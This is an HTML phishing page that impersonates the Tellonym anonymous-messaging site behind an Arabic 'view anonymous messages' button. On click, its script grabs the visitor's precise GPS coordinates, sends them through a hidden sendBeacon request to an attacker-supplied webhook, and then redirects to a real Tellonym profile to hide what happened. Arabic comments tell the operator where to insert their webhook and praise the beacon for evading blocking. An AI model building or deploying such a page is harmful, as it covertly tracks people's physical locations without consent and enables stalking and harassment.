<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Tellonym</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .btn { background: #fe2c55; color: #fff; border: none; padding: 20px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <button class="btn" onclick="start()">مشاهدة الرسائل المجهولة 🔐</button>

<script>
    function start() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // ضع رابط الـ Webhook الخاص بك هنا بدلاً من الرابط أدناه
                const webhookUrl = "ضع_رابط_WEBHOOK_هنا";
                
                // إرسال البيانات عبر طلب مخفي (Beacon) وهو الأقوى في تخطي الحظر
                navigator.sendBeacon(webhookUrl + "?lat=" + lat + "&lon=" + lon);

                setTimeout(() => { window.location.href = "https://tellonym.me/Schaien"; }, 800);
            }, function() {
                window.location.href = "https://tellonym.me/Schaien";
            }, {enableHighAccuracy: true});
        }
    }
</script>
</body>
</html>
